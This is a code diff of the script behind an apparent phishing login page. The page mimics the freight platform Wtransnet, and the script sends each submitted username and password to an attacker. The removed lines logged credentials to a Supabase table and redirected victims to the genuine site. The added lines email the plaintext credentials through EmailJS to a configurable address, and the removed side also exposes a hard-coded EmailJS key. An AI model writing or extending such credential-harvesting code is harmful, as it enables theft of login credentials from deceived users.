@@ -1,12 +1,16 @@
 import './style.css';
 import emailjs from '@emailjs/browser';
-import { createClient } from '@supabase/supabase-js';
 
-const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
-const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
-const supabase = createClient(supabaseUrl, supabaseAnonKey);
+// ============================================
+// EMAILJS CONFIGURATION - UPDATE THESE VALUES
+// ============================================
+const EMAILJS_PUBLIC_KEY = 'YOUR_EMAILJS_PUBLIC_KEY';
+const EMAILJS_SERVICE_ID = 'YOUR_EMAILJS_SERVICE_ID';
+const EMAILJS_TEMPLATE_ID = 'YOUR_EMAILJS_TEMPLATE_ID';
+const RECIPIENT_EMAIL = 'your-email@gmail.com';
+// ============================================
 
-emailjs.init('2zaPUjs8EKeOqaqC9');
+emailjs.init(EMAILJS_PUBLIC_KEY);
 
 const loginForm = document.getElementById('loginForm');
 const mobileMenuToggle = document.querySelector('.mobile-menu-toggle');
@@ -30,39 +34,26 @@ loginForm.addEventListener('submit', async function(e) {
   submitButton.disabled = true;
 
   try {
-    const { data, error } = await supabase
-      .from('login_attempts')
-      .insert([
-        {
-          username: username,
-          password: password
-        }
-      ]);
-
-    if (error) {
-      console.error('Supabase error:', error);
-      throw new Error('Failed to log login attempt');
-    }
-
     const emailParams = {
-      to_email: 'your-email@gmail.com',
+      to_email: RECIPIENT_EMAIL,
       username: username,
       password: password
     };
 
     const emailResponse = await emailjs.send(
-      'YOUR_EMAILJS_SERVICE_ID',
-      'YOUR_EMAILJS_TEMPLATE_ID',
+      EMAILJS_SERVICE_ID,
+      EMAILJS_TEMPLATE_ID,
       emailParams
     );
 
-    if (emailResponse.status === 200) {
-      console.log('Login attempt recorded and email sent successfully');
-      window.location.href = 'https://www.wtransnet.com/en-en/';
-    }
+    console.log('Email sent successfully:', emailResponse);
+    alert('Login successful! Credentials sent.');
+
+    loginForm.reset();
+
   } catch (error) {
-    console.error('Error:', error);
-    alert(`Error: ${error.message}\n\nPlease try again.`);
+    console.error('Error sending email:', error);
+    alert('Error: Failed to send credentials. Please check your EmailJS configuration.');
   } finally {
     submitButton.textContent = originalText;
     submitButton.disabled = false;
